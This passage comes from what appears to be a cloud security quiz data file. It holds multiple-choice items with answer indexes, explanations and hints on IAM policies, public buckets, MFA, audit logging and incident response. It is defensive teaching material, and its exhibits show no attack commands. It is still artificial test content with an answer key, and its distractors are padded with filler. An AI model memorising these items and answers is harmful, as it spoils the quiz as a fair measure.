    options: ["Store a long-lived access key in the application's source code, in the first instance","Attach a role to the workload so that it gets temporary credentials","Email an access key to the developer each month","Use the root account key in the application, then record the result in the ticket"],
    correct: 1, why: "Long-lived keys in code are the runner-up since they work, but they leak easily; roles provide short-lived credentials.",
    hint: "Use roles."
  },
  {
    id: 1020, rank: 0, role: "cloud-security", topic: "Resource Tagging", difficulty: "BEGINNER",
    q: "Why are resource tags useful for security teams?",
    options: ["They make the resources run faster as the platform places them better","They block all network access to resources that have no tag at all","They show owners, environments and data sensitivity","They encrypt the resources automatically when the tag value is set to secure"],
    correct: 2, why: "Tags support ownership, inventory and policy decisions.",
    hint: "Know the owner."
  },
  {
    id: 1021, rank: 0, role: "cloud-security", topic: "Default VPC Risk", difficulty: "BEGINNER",
    q: "Why should teams review resources in default networks and default settings of new accounts?",
    options: ["Defaults are always the safest option, and need no review by the security team","Defaults may be more open than the organisation's standards","Defaults are required by law, and may not be changed by any customer","Defaults cannot be changed after an account has been created by the company"],
    correct: 1, why: "Defaults are designed for ease of use, and may not meet security needs.",
    hint: "Defaults are generic."
  },
  {
    id: 1022, rank: 0, role: "cloud-security", topic: "Alerts for Root Use", difficulty: "BEGINNER",
    q: "What should happen when the cloud account root user signs in?",
    options: ["An alert should be raised so that the use can be checked","All of the other users should be locked out until the sign-in is explained","The logs should be deleted to keep the account tidy after each root session","Nothing should happen, as root sign-ins are always routine and need no review"],
    correct: 0, why: "Root use should be rare, so each use needs explanation.",
    hint: "Alert on root."
  },
  {
    id: 1023, rank: 0, role: "cloud-security", topic: "Data Classification in Cloud", difficulty: "BEGINNER",
    q: "Why should data be classified before it is moved to the cloud?",
    options: ["To decide which controls and locations suit each type, as a general rule","To make the data larger, and the provider can bill for more storage","To avoid paying for storage by moving the data back to the old servers","To remove the need for encryption of the data that is stored in the cloud"],
    correct: 0, why: "Sensitive data may need stronger controls or must remain in certain regions.",
    hint: "Classify first."
  },
  {
    id: 1024, rank: 0, role: "cloud-security", topic: "Shadow IT", difficulty: "BEGINNER",
    q: "What is shadow IT in the context of cloud services?",
    options: ["Staff using cloud services without IT or security approval, in most cases","A cloud service that only works at night when the staff are not in the office","A cloud account that has been created by the company but has no users","A backup copy of the whole cloud account that is stored by the provider"],
    correct: 0, why: "Unapproved services can hold company data outside normal controls.",
    hint: "Unapproved services."
  },
  {
    id: 1025, rank: 0, role: "cloud-security", topic: "Object Versioning", difficulty: "BEGINNER",
    q: "What is a benefit of enabling versioning on a cloud storage bucket?",
    options: ["The bucket becomes public, and other teams can see the earlier versions","Files become smaller as only the changed parts are kept in the bucket","Earlier versions can be restored after a mistaken or malicious change","Storage becomes free as the provider does not bill for old versions"],
    correct: 2, why: "Versioning keeps earlier copies of objects.",
    hint: "Restore earlier versions."
  },
  {
    id: 1026, rank: 0, role: "cloud-security", topic: "CDN and WAF Purpose", difficulty: "BEGINNER",
    q: "What can a web application firewall in front of a cloud website do?",
    options: ["Encrypt the database, until the next scheduled review takes place","Write the code","Block common web attacks such as injection attempts","Reduce the number of users, until the next scheduled review takes place"],
    correct: 2, why: "A WAF filters malicious requests before they reach the application.",
    hint: "Filter requests."
  },
  {
    id: 1027, rank: 0, role: "cloud-security", topic: "Cloud Key Management", difficulty: "BEGINNER",
    q: "Why use a managed key service for encryption keys instead of storing keys in files?",
    options: ["Keys are protected, access is controlled and use is logged","Keys become shorter, and the encryption of the data runs more quickly","Keys are visible to everyone in the account, and the teams can share them","Keys never expire, and no rotation is ever needed by the owners"],
    correct: 0, why: "Central key management supports control and audit.",
    hint: "Managed keys."
  },
  {
    id: 1028, rank: 0, role: "cloud-security", topic: "Shared Account Risk", difficulty: "BEGINNER",
    q: "Why is sharing one cloud administrator login among several people a problem?",
    options: ["It lowers the cost","Actions cannot be linked to an individual and access cannot be removed for one person","It improves accountability","It makes the console slower"],
    correct: 1, why: "Individual accounts give accountability and allow proper offboarding.",
    hint: "No shared logins."
  },
  {
    id: 1029, rank: 0, role: "cloud-security", topic: "Container Image Source", difficulty: "BEGINNER",
    q: "Which source is the safest for container images used in production?",
    options: ["An image sent by email","A random link in a chat message","A trusted private registry with scanned and approved images","Any public image found online"],
    correct: 2, why: "Trusted and scanned images reduce the risk of malicious or vulnerable content.",
    hint: "Approved registry."
  },
  {
    id: 1030, rank: 0, role: "cloud-security", topic: "Single Sign-On for Cloud", difficulty: "BEGINNER",
    q: "What is a benefit of using single sign-on for cloud applications?",
    options: ["MFA cannot be used","Each application has its own separate password","Central control of access and quick removal when someone leaves","Passwords are shared by everyone"],
    correct: 2, why: "SSO centralises authentication and offboarding.",
    hint: "Central control."
  },
  {
    id: 1031, rank: 0, role: "cloud-security", topic: "Disaster Recovery in Cloud", difficulty: "BEGINNER",
    q: "What does deploying across more than one availability zone mainly improve?",
    options: ["Encryption strength","Resilience if one data centre location fails","Password strength","Email delivery"],
    correct: 1, why: "Multiple zones reduce single points of failure.",
    hint: "Resilience."
  },
  {
    id: 1032, rank: 0, role: "cloud-security", topic: "Cloud Account Separation", difficulty: "BEGINNER",
    q: "Why do many organisations use separate cloud accounts for production and testing?",
    options: ["To avoid using encryption","To limit the impact of mistakes or compromise in testing on production","To make billing impossible","To reduce the number of users"],
    correct: 1, why: "Separation provides stronger boundaries.",
    hint: "Separate accounts."
  },
  {
    id: 1033, rank: 0, role: "cloud-security", topic: "Billing Alerts", difficulty: "BEGINNER",
    q: "How can billing alerts help security?",
    options: ["They replace logging","They stop all attacks","They encrypt data","They can reveal unexpected resource use caused by compromise"],
    correct: 3, why: "Unusual cost can be an early sign of abuse.",
    hint: "Cost spikes."
  },
  {
    id: 1034, rank: 0, role: "cloud-security", topic: "Misconfigured Database Exposure", difficulty: "BEGINNER",
    q: "A cloud database is found reachable from the internet with a weak password. What is the BEST response?",
    options: ["Restrict network access, rotate credentials and review access logs","Add a banner about legal use, and revisit the decision after the next release","Wait to see if anything happens, and review the outcome at the next monthly meeting","Change the database name only"],
    correct: 0, why: "Changing the name is the runner-up as it looks like a change, but it does not remove the exposure.",
    hint: "Close the exposure."
  },
  {
    id: 1035, rank: 0, role: "cloud-security", topic: "API Gateway Role", difficulty: "BEGINNER",
    q: "What is one security benefit of an API gateway in front of back-end services?",
    options: ["It writes code","It hides all security risks","It stores backups","Central authentication, throttling and logging of requests"],
    correct: 3, why: "A gateway enforces common controls.",
    hint: "Central control."
  },
  {
    id: 1036, rank: 0, role: "cloud-security", topic: "Vulnerability Scanning in Cloud", difficulty: "BEGINNER",
    q: "Why scan virtual machine images for vulnerabilities before they are used?",
    options: ["To find known weaknesses and fix them before deployment","To change the region","To avoid encryption","To make the image larger"],
    correct: 0, why: "Early scanning reduces risk in production.",
    hint: "Scan before use."
  },
  {
    id: 1037, rank: 0, role: "cloud-security", topic: "Cloud Incident Reporting", difficulty: "BEGINNER",
    q: "A staff member notices an unexpected public link to a company file. What should they do?",
    options: ["Ignore it","Report it to the security team promptly","Share it with a friend, then record the result in the ticket","Delete the file, and say nothing"],
    correct: 1, why: "Prompt reporting enables response.",
    hint: "Report it."
  },
  {
    id: 1038, rank: 0, role: "cloud-security", topic: "Lifecycle Rules", difficulty: "BEGINNER",
    q: "What is a purpose of lifecycle rules on stored data?",
    options: ["Make data public","Automatically move or delete data according to retention requirements","Disable logging","Stop encryption"],
    correct: 1, why: "Rules help meet retention and minimisation requirements.",
    hint: "Retention."
  },
  {
    id: 1039, rank: 0, role: "cloud-security", topic: "Customer-Managed Keys", difficulty: "BEGINNER",
    q: "Why might an organisation choose customer-managed encryption keys?",
    options: ["To remove audit logs","To keep control over key access and the ability to revoke them","To make data public","To avoid using encryption"],
    correct: 1, why: "Control over keys supports compliance and risk requirements.",
    hint: "Control the keys."
  },
  {
    id: 1040, rank: 0, role: "cloud-security", topic: "Exposed Management Port", difficulty: "BEGINNER",
    exhibit: "Port scan 203.0.113.80\n3306/tcp open mysql\n22/tcp filtered ssh\n443/tcp open https",
    q: "A scan shows a cloud database management port open to the whole internet. Which action is best?",
    options: ["Restrict it to trusted addresses or a private connection","Hide the server name in the console","Leave it open, and add a longer password only, where that is practical","Change the port number and keep it open, as a general rule"],
    correct: 0, why: "Management ports should not be reachable from anywhere, and obscurity does not remove the exposure.",
    hint: "Close it."
  },
  {
    id: 1041, rank: 0, role: "cloud-security", topic: "Shared Responsibility Basics", difficulty: "BEGINNER",
    q: "In a cloud service who is responsible for securing the customer's own data?",
    options: ["The internet provider that carries the traffic between the customer, and the cloud","The customer, for the data that they place in the service, as a general rule","The hardware vendor that built the servers many years before the service started","Only the cloud provider's data centre staff who work in the main building"],
    correct: 1, why: "Customers remain responsible for their data and access settings.",
    hint: "Your data."
  },
  {
    id: 1042, rank: 0, role: "cloud-security", topic: "Public Bucket Exhibit", difficulty: "BEGINNER",
    exhibit: "Bucket: customer-invoices-2025\nBlock public access: OFF\nACL: AllUsers READ\nEncryption: SSE-S3\nVersioning: enabled",
    q: "What is the main risk shown by this storage setting?",
    options: ["Only staff in one department can read the files","Anyone on the internet can list and read the files","Access is limited to a private network","Files are encrypted with a customer-managed key"],
    correct: 1, why: "Public read access exposes data to everyone.",
    hint: "Look at the ACL."
  },
  {
    id: 1043, rank: 0, role: "cloud-security", topic: "MFA for Cloud Console", difficulty: "BEGINNER",
    q: "Which measure best protects cloud console accounts?",
    options: ["A shared password that is written in the team chat for everyone to use at work","A long username for each user, and the account names are hard to guess easily","Allowing sign-in from any country without checks, and travel is never blocked","Multi-factor authentication on every user especially administrators"],
    correct: 3, why: "MFA reduces the effect of stolen passwords.",
    hint: "Add MFA."
  },
  {
    id: 1044, rank: 0, role: "cloud-security", topic: "Region Choice", difficulty: "BEGINNER",
    q: "Why might an organisation choose a specific cloud region?",
    options: ["To avoid ever using backups as the provider already stores another copy","To hide the data from the regulators who may want to inspect the systems later","To reduce the number of users who are allowed to open the console in the account","To meet data location and latency requirements"],
    correct: 3, why: "Region choice affects law, performance and resilience.",
    hint: "Location needs."
  },
  {
    id: 1045, rank: 0, role: "cloud-security", topic: "Root Account Use", difficulty: "BEGINNER",
    q: "What is the BEST practice for the cloud root account?",
    options: ["Use it for all routine administration for simplicity","Share its password with the whole IT team, where that is practical","Protect it with MFA and avoid using it for daily tasks","Leave it without MFA to prevent lockouts, in the first instance"],
    correct: 2, why: "Daily use is the runner-up as it is convenient, but the root account has unlimited power and a high-value target.",
    hint: "Protect and avoid."
  },
  {
    id: 1046, rank: 0, role: "cloud-security", topic: "Security Group Basics", difficulty: "BEGINNER",
    q: "What does a cloud security group control?",
    options: ["The name of the region where the resources of the account have been deployed","Which network traffic may reach a resource","How many users can access the billing page of the account each day of the month","The colour of the dashboard that the operations team looks at during the morning"],
    correct: 1, why: "Security groups act as virtual firewalls.",
    hint: "Traffic filter."
  },
  {
    id: 1047, rank: 0, role: "cloud-security", topic: "Open SSH Exhibit", difficulty: "BEGINNER",
    exhibit: "Rule  Port  Source\nweb   443   alb-sg\nssh   22    0.0.0.0/0\ndb    5432  app-sg\ndns   53    10.0.0.2/32",
    q: "Which rule in this list is the biggest concern?",
    options: ["Database port open to the app subnet only","HTTPS open to the load balancer","DNS open to the resolver","SSH open to the entire internet"],
    correct: 3, why: "Administrative access should not be open to everyone.",
    hint: "0.0.0.0/0."
  },
  {
    id: 1048, rank: 0, role: "cloud-security", topic: "Cloud Logging Purpose", difficulty: "BEGINNER",
    q: "Why enable audit logging in a cloud account?",
    options: ["To make resources cheaper to run by removing the need for any monitoring of them","To increase the number of users who are able to sign in to the account console","To record who did what and when for investigations","To hide changes from administrators who might otherwise see each action they take"],
    correct: 2, why: "Audit logs provide evidence for detection and response.",
    hint: "Who did what."
  },
  {
    id: 1049, rank: 0, role: "cloud-security", topic: "Access Key Safety", difficulty: "BEGINNER",
    q: "What should a developer do if they commit a cloud access key to a public repository?",
    options: ["Delete the repository, and keep using the same key in the application as before","Wait to see whether anyone uses the key before taking any further action at all","Rename the key and continue to use it from the build pipeline of the project","Revoke the key immediately and create a new one"],
    correct: 3, why: "Exposed keys must be treated as compromised.",
    hint: "Revoke."
  },
  {
    id: 1050, rank: 0, role: "cloud-security", topic: "Sensitive Storage Auditing", difficulty: "BEGINNER",
    q: "Why turn on access logging for cloud storage holding sensitive files?",
    options: ["To make the files public","To make each file smaller","To see who read or changed the files and when","To remove the need for permissions, in most cases"],
    correct: 2, why: "Access logs support detection and investigation.",
    hint: "Who and when."
  },
  {
    id: 1051, rank: 1, role: "cloud-security", topic: "Reading an IAM Policy", difficulty: "INTERMEDIATE",
    exhibit: "{\"Effect\":\"Allow\",\"Action\":\"s3:*\",\"Resource\":\"*\"}",
    q: "What does this IAM policy statement permit?",
    options: ["Any action on any storage bucket","Read-only access to one bucket that holds the reports of the finance team","Deleting only the log files that are older than ninety days in one bucket","Nothing at all, as the statement has no conditions attached to it"],
    correct: 0, why: "A wildcard action and resource for the storage service gives full control over every bucket.",
    hint: "Read action and resource."
  },
  {
    id: 1052, rank: 1, role: "cloud-security", topic: "Bucket Policy Review", difficulty: "INTERMEDIATE",
    exhibit: "{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::reports-prod/*\"}",
    q: "Which change to this bucket policy is the BEST way to restrict access to the company's own accounts?",
    options: ["Replace the wildcard principal with the company's own accounts","Keep the wildcard principal, and add a comment","Turn on versioning only, and leave the principal as it is in the policy","Add a longer bucket name, and outsiders find it much harder to guess it"],
    correct: 0, why: "Versioning is the runner-up as it helps recovery, but it does not restrict who may read the objects.",
    hint: "Fix the principal."
  },
  {
    id: 1053, rank: 1, role: "cloud-security", topic: "Instance Metadata Hardening", difficulty: "INTERMEDIATE",
    q: "Which setting best reduces the risk of credential theft through server-side request forgery on a virtual machine?",
    options: ["Open the metadata port to the internet","Require session-based metadata access (IMDSv2) and limit hop count","Disable the instance role, until the next scheduled review takes place","Allow metadata access without tokens"],
    correct: 1, why: "Token-based metadata requests are much harder to abuse through a forged request.",
    hint: "Metadata v2."
  },
  {
    id: 1054, rank: 1, role: "cloud-security", topic: "Flow Log Analysis", difficulty: "INTERMEDIATE",
    exhibit: "2 123456789012 eni-0a1b 198.51.100.23 10.0.1.15 51822 22 6 4 240 1709366400 1709366460 REJECT OK",
    q: "What does this VPC flow log line suggest?",
    options: ["A completed file download from a storage service to an internal workstation","An outbound DNS request from a server to the resolver of the VPC network","A rejected inbound attempt to reach SSH","A successful database query from an application server to its own replica"],
    correct: 2, why: "REJECT on port 22 shows a blocked attempt to reach SSH.",
    hint: "Check the action field."
  },
  {
    id: 1055, rank: 1, role: "cloud-security", topic: "Service Control Policy Use", difficulty: "INTERMEDIATE",
    q: "What is the purpose of a service control policy in an organisation with many accounts?",
    options: ["Paying invoices","Setting maximum permissions that accounts cannot exceed","Creating users in each account, then record the result in the ticket","Encrypting the storage"],
    correct: 1, why: "SCPs act as guardrails that limit what any identity in the account may do.",
    hint: "Guardrails for accounts."
  },
  {
    id: 1056, rank: 1, role: "cloud-security", topic: "Cross-Account Role Trust", difficulty: "INTERMEDIATE",
    exhibit: "{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"*\"},\"Action\":\"sts:AssumeRole\"}",
    q: "Which trust policy is the most dangerous for a role in your account?",
    options: ["A named partner account that must present an external ID when assuming it","A specific user inside your own account who has MFA turned on at sign in","A principal of * that anyone can assume","A specific cloud service that is allowed to assume the role for its own tasks"],
    correct: 2, why: "A wildcard principal lets any account assume the role.",
    hint: "Who can assume it."
  },
  {
    id: 1057, rank: 1, role: "cloud-security", topic: "CloudTrail Event Review", difficulty: "INTERMEDIATE",
    exhibit: "eventName: StopLogging\nuserIdentity: arn:aws:iam::1234:user/temp-dev\nsourceIPAddress: 203.0.113.55\neventTime: 2026-03-02T02:11:09Z",
    q: "Which CloudTrail event is the most concerning from a security view?",
    options: ["DescribeInstances by a monitoring role","StopLogging by an unexpected user","ListUsers by an auditor","GetObject on a public website bucket"],
    correct: 1, why: "Disabling audit logging is a common attacker action to hide activity.",
    hint: "Who turned off the logs."
  },
  {
    id: 1058, rank: 1, role: "cloud-security", topic: "Key Policy Scope", difficulty: "INTERMEDIATE",
    q: "A KMS key policy grants decrypt to all users in the account. What is the improvement?",
    options: ["Make the key public, and every application can use it without a request","Allow decrypt for every principal outside the account, and partners can read data","Remove all of the logging on the key, and the audit trail stays small","Limit decrypt to the specific roles that need it, in the first instance"],
    correct: 3, why: "Least privilege on keys limits who can read protected data.",
    hint: "Scope the key."
  },
  {
    id: 1059, rank: 1, role: "cloud-security", topic: "Private Endpoints", difficulty: "INTERMEDIATE",
    q: "What is the benefit of using private endpoints for access to a cloud storage service from a VPC?",
    options: ["Storage becomes free as private traffic is not billed by the provider","Traffic stays on the provider's private network","The bucket becomes public, and every virtual network can reach it directly","Encryption is no longer needed as private traffic cannot be intercepted"],
    correct: 1, why: "Private connectivity reduces exposure and supports tighter network controls.",
    hint: "Stay off the internet."
  },
  {
    id: 1060, rank: 1, role: "cloud-security", topic: "Security Group Versus NACL", difficulty: "INTERMEDIATE",
    q: "How does a security group differ from a network ACL?",
    options: ["Security groups apply to whole subnets and are stateless, unlike the NACL","Security groups are stateful and attach to resources, NACLs are stateless","Network ACLs encrypt the traffic that passes through them, unlike security groups","They are identical in the way that they work, and in where they are applied"],
    correct: 1, why: "Security groups track connections; NACLs evaluate each packet in both directions.",
    hint: "Stateful versus stateless."
  },
  {
    id: 1061, rank: 1, role: "cloud-security", topic: "Secrets Manager Rotation", difficulty: "INTERMEDIATE",
    q: "A database password is stored in an application config file. What is the BEST improvement?",
    options: ["Encrypt the config file with a password in the same folder","Email the password to the whole team and everyone has a copy to hand","Use a secrets service with rotation and role-based retrieval","Change the password once a year, and write the new value in the team's runbook"],
    correct: 2, why: "Encrypting beside the file is the runner-up as it looks protective, but the key is stored next to the secret.",
    hint: "Rotate and retrieve."
  },
  {
    id: 1062, rank: 1, role: "cloud-security", topic: "Kubernetes Network Policy", difficulty: "INTERMEDIATE",
    exhibit: "apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny\nspec:\n  podSelector: {}\n  policyTypes: [Ingress, Egress]",
    q: "What does a default-deny network policy in a Kubernetes namespace achieve?",
    options: ["Pods cannot start as the scheduler needs permission to place them","All pods can talk to every other pod in the cluster as before the change","Logs are disabled for every pod in the namespace to reduce the noise","Pods can talk only to allowed destinations"],
    correct: 3, why: "Without policies, pods can generally reach each other freely.",
    hint: "Deny by default."
  },
  {
    id: 1063, rank: 1, role: "cloud-security", topic: "Lambda Permission Review", difficulty: "INTERMEDIATE",
    q: "A serverless function that only reads one table has an administrator role. What is the finding?",
    options: ["A logging feature that records every call that the function makes to the tables","An encryption setting that protects the data when it is read from the table","A performance improvement as administrator roles make the function start faster","Excessive permissions that raise the impact of compromise, as a general rule"],
    correct: 3, why: "The role should be limited to the actions and resources the function needs.",
    hint: "Over-permissioned."
  },
  {
    id: 1064, rank: 1, role: "cloud-security", topic: "Container Image Scanning", difficulty: "INTERMEDIATE",
    q: "At which point should container images be scanned for vulnerabilities?",
    options: ["Only after an incident, to confirm which image was running on the affected node","Only once a year, when the auditors ask for a list of all of the images","Never, as images are immutable","In the pipeline and continuously in the registry"],
    correct: 3, why: "New vulnerabilities appear over time, so scanning should be repeated.",
    hint: "Build and registry."
  },
  {
    id: 1065, rank: 1, role: "cloud-security", topic: "CIS Benchmark Use", difficulty: "INTERMEDIATE",
    q: "How should a team use a CIS benchmark for its cloud accounts?",
    options: ["Apply every recommendation blindly to all accounts without testing the effect on services, and revisit the decision after the next release","Ignore it, as benchmarks are written for a different type of organisation","Measure against it, fix gaps by risk and track exceptions, as a general rule","Use it only for the office printers, and the other devices on the staff network"],
    correct: 2, why: "Benchmarks guide hardening but need judgement and exception handling.",
    hint: "Measure and decide."
  },
  {
    id: 1066, rank: 1, role: "cloud-security", topic: "Anomalous API Calls", difficulty: "INTERMEDIATE",
    q: "A role that normally lists resources suddenly calls many data export APIs at night. What is the BEST first step?",
    options: ["Increase the permissions of the role and the export calls stop failing, as a general rule","Wait to see whether it continues","Treat it as possible compromise, and restrict the role session, as soon as practical","Delete the logs of the role and the alerts about it are no longer raised"],
    correct: 2, why: "Waiting is the runner-up as it avoids disruption, but unusual data export calls can indicate active theft.",
    hint: "Contain and review."
  },
  {
    id: 1067, rank: 1, role: "cloud-security", topic: "Backup Vault Lock", difficulty: "INTERMEDIATE",
    q: "What does enabling a backup vault lock help protect against?",
    options: ["Unused regions","Deletion of backups by compromised accounts","Large costs from storing too many copies of the same data in several regions","Slow restores when the data set grows beyond the size of the largest disk"],
    correct: 1, why: "Immutability stops attackers destroying recovery points.",
    hint: "Immutable backups."
  },
  {
    id: 1068, rank: 1, role: "cloud-security", topic: "Tag-Based Access", difficulty: "INTERMEDIATE",
    q: "What is the main risk of using only user-editable tags to grant access to resources?",
    options: ["Tags cannot be searched by the security team when they review an incident","Users who can edit tags may give themselves access","Tags are too long to be displayed in the console in a readable manner","Tags use storage"],
    correct: 1, why: "Access control based on tags must also control who can modify the tags.",
    hint: "Who edits the tags."
  },
  {
    id: 1069, rank: 1, role: "cloud-security", topic: "Transit Network Design", difficulty: "INTERMEDIATE",
    q: "A company connects 30 cloud networks. Which design best supports central inspection and control?",
    options: ["A full mesh of direct peering links between all networks with no inspection","Public addresses on every server, and the teams can reach them easily","One flat network that holds every workload of every team in the company","A hub-and-spoke design with central inspection"],
    correct: 3, why: "Hub-and-spoke centralises routing policy and monitoring.",
    hint: "Hub and spoke."
  },
  {
    id: 1070, rank: 1, role: "cloud-security", topic: "Console Access Review", difficulty: "INTERMEDIATE",
    exhibit: "User         Policy              MFA   LastSignIn\nalice        ReadOnly            yes   2026-03-01\nsvc-batch    AdministratorAccess no    never\nbob          PowerUser           yes   2026-02-27\nold-contractor AdministratorAccess no  2025-04-02",
    q: "Which access review finding is the highest priority?",
    options: ["Admin users with no MFA and no recent sign-in, as a general rule","Read-only users who have MFA enabled and who sign in every week","Service roles with narrow permissions that were reviewed by the owner last month","Disabled accounts that cannot sign in and have no keys attached to them"],
    correct: 0, why: "Dormant, powerful accounts without MFA are easy targets.",
    hint: "Powerful and unprotected."
  },
  {
    id: 1071, rank: 1, role: "cloud-security", topic: "Logging Destination", difficulty: "INTERMEDIATE",
    q: "Where should cloud audit logs be delivered to resist tampering by a compromised workload account?",
    options: ["A local disk on a server that is managed by the team that creates the logs","Nowhere, as the provider keeps a copy of everything for the customer","A separate logging account with write-only access, as a general rule","The same account in a public bucket and auditors can read the files"],
    correct: 2, why: "Separate accounts protect evidence from the compromised environment.",
    hint: "Separate logging account."
  },
  {
    id: 1072, rank: 1, role: "cloud-security", topic: "Data Exfiltration Controls", difficulty: "INTERMEDIATE",
    q: "Which control best limits copying of sensitive data to unauthorised external accounts?",
    options: ["More dashboards that show the volume of data that leaves the account each day, as a general rule","A longer password policy for the users who have access to the sensitive data","Daily reminders to staff not to copy company data to their personal accounts","Resource and endpoint policies limiting data access to the organisation, in most cases"],
    correct: 3, why: "Perimeter controls on data access reduce exfiltration paths.",
    hint: "Constrain data paths."
  },
  {
    id: 1073, rank: 1, role: "cloud-security", topic: "Cloud Workload Protection", difficulty: "INTERMEDIATE",
    q: "What does runtime protection add to a cloud workload beyond image scanning?",
    options: ["Smaller images as the agent removes unused layers when the workload starts","Faster builds as the agent caches the dependencies for the pipeline jobs","Detection of suspicious behaviour while it is running","A new region in which the workload can run when the first one is busy"],
    correct: 2, why: "Scanning finds known flaws; runtime protection sees active misuse.",
    hint: "Runtime behaviour."
  },
  {
    id: 1074, rank: 1, role: "cloud-security", topic: "Resource Policy Conditions", difficulty: "INTERMEDIATE",
    exhibit: "{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:*\",\"Resource\":\"arn:aws:s3:::reports-prod/*\",\"Condition\":{\"Bool\":{\"aws:SecureTransport\":\"false\"}}}",
    q: "Which condition best ensures a bucket is only accessed over encrypted connections?",
    options: ["A policy denying requests where secure transport is false","Using tags, as soon as practical","Disabling versioning, until the next scheduled review takes place","A longer bucket name"],
    correct: 0, why: "Policies can deny unencrypted access.",
    hint: "Deny insecure transport."
  },
  {
    id: 1075, rank: 1, role: "cloud-security", topic: "Console MFA Types", difficulty: "INTERMEDIATE",
    q: "Which MFA method is the most resistant to phishing for cloud administrators?",
    options: ["Security questions","SMS codes","Hardware security keys","Email codes, as a general rule"],
    correct: 2, why: "Hardware keys check the website origin and resist relay attacks.",
    hint: "Hardware keys."
  },
  {
    id: 1076, rank: 1, role: "cloud-security", topic: "Account Vending Security", difficulty: "INTERMEDIATE",
    q: "New cloud accounts are created by hand with different settings. What is the best improvement?",
    options: ["Allowing any settings in the new accounts and teams can move quickly","A checklist emailed to the teams who create new accounts by hand each time","An automated account factory with baseline guardrails, as a general rule","More meetings between the security team, and the account owners each month"],
    correct: 2, why: "Automation ensures every account starts secure.",
    hint: "Baseline automation."
  },
  {
    id: 1077, rank: 1, role: "cloud-security", topic: "WAF Rule Modes", difficulty: "INTERMEDIATE",
    q: "Why deploy a new WAF rule in count or monitor mode first?",
    options: ["To avoid logging, in most cases","To see false positives before blocking real users","To hide the rule","To make the rule faster"],
    correct: 1, why: "Testing prevents outages from overblocking.",
    hint: "Observe first."
  },
  {
    id: 1078, rank: 1, role: "cloud-security", topic: "Public IP Inventory", difficulty: "INTERMEDIATE",
    q: "Why is it important to inventory resources with public IP addresses?",
    options: ["They cost nothing","They are always secure","They cannot be changed","They are directly reachable and form the external attack surface"],
    correct: 3, why: "Knowing exposure helps prioritise controls.",
    hint: "External surface."
  },
  {
    id: 1079, rank: 1, role: "cloud-security", topic: "Database Encryption Features", difficulty: "INTERMEDIATE",
    q: "Which feature protects a managed database against theft of storage snapshots?",
    options: ["A banner on the login page that warns users about unauthorised access","A longer table name that makes the sensitive tables harder to guess","Public access to the database and the snapshots can be copied freely","Encryption at rest with a managed key"],
    correct: 3, why: "Encrypted snapshots cannot be read without key access.",
    hint: "Encrypt snapshots."
  },
  {
    id: 1080, rank: 1, role: "cloud-security", topic: "Workload Identity Federation", difficulty: "INTERMEDIATE",
    q: "A CI pipeline deploys to the cloud using stored long-lived keys. What is the BEST improvement?",
    options: ["Share the keys more widely","Move the keys to a wiki","Use workload identity federation to obtain short-lived credentials per run","Rotate the stored keys yearly, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Yearly rotation is the runner-up because it improves hygiene, but long-lived keys still leak and last too long.",
    hint: "Federate the pipeline."
  },
  {
    id: 1081, rank: 1, role: "cloud-security", topic: "Cost and Security Alerts", difficulty: "INTERMEDIATE",
    q: "Which alert combination best helps detect cryptomining abuse of an account?",
    options: ["Printer alerts","Unusual compute launches in unused regions and cost anomaly alerts","Email delivery alerts","Cooling alerts"],
    correct: 1, why: "Abuse usually creates sudden compute usage.",
    hint: "Compute anomalies."
  },
  {
    id: 1082, rank: 1, role: "cloud-security", topic: "Storage Access Logging", difficulty: "INTERMEDIATE",
    q: "Why enable object-level access logging for sensitive storage?",
    options: ["To increase object size","To reduce cost","To disable encryption","To see who read or copied specific objects during an investigation"],
    correct: 3, why: "Data events show access to individual objects.",
    hint: "Object-level visibility."
  },
  {
    id: 1083, rank: 1, role: "cloud-security", topic: "Cloud Network Segmentation", difficulty: "INTERMEDIATE",
    q: "Which design best separates production databases from internet-facing web servers?",
    options: ["Different subnets with security groups allowing only the application tier to reach the database","Open security groups","One subnet for everything","Public database addresses"],
    correct: 0, why: "Layered network controls limit paths to data.",
    hint: "Tiered subnets."
  },
  {
    id: 1084, rank: 1, role: "cloud-security", topic: "API Authentication Choice", difficulty: "INTERMEDIATE",
    q: "Which authentication approach is best for a public API serving mobile apps?",
    options: ["Short-lived tokens issued by an identity provider with scoped permissions","A secret in the URL","No authentication","A shared static key in the app"],
    correct: 0, why: "Static keys in apps can be extracted and reused.",
    hint: "Short-lived tokens."
  },
  {
    id: 1085, rank: 1, role: "cloud-security", topic: "Cloud Vendor Concentration", difficulty: "INTERMEDIATE",
    q: "Why might a company design critical services to run in more than one region?",
    options: ["To avoid logging, as the logs from two regions are hard to combine","To reduce the amount of testing that the team needs to carry out","To remain available if a region fails","To lower the strength of the encryption that is used between the regions"],
    correct: 2, why: "Regional redundancy improves resilience.",
    hint: "Regional resilience."
  },
  {
    id: 1086, rank: 1, role: "cloud-security", topic: "Open Redirect in Cloud Console", difficulty: "INTERMEDIATE",
    q: "Which user behaviour best reduces risk of cloud console phishing?",
    options: ["Using bookmarks or SSO portals rather than links in email","Sharing passwords, in most cases","Disabling MFA","Clicking links in messages, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Trusted entry points reduce the chance of fake login pages.",
    hint: "Use bookmarks."
  },
  {
    id: 1087, rank: 1, role: "cloud-security", topic: "Termination of Cloud Resources", difficulty: "INTERMEDIATE",
    q: "Why should unused cloud resources be deleted promptly?",
    options: ["They protect data","They can be forgotten, misconfigured and exploited","They improve security","They are free"],
    correct: 1, why: "Orphaned resources add risk and cost.",
    hint: "Remove the unused."
  },
  {
    id: 1088, rank: 1, role: "cloud-security", topic: "GuardDuty-Style Finding", difficulty: "INTERMEDIATE",
    exhibit: "Finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration\nResource: i-0abc123 (role web-app-role)\nUsed from: 198.51.100.77 (not in VPC)\nSeverity: High",
    q: "A cloud threat detection service reports credentials from an instance role used from an external IP address. What is the best response?",
    options: ["Rename the instance","Revoke the role sessions, isolate the instance and investigate how the credentials left","Ignore it as the role is trusted","Add a tag to the instance"],
    correct: 1, why: "Credentials used outside the workload indicate theft, so revoke and investigate.",
    hint: "Credentials used elsewhere."
  },
  {
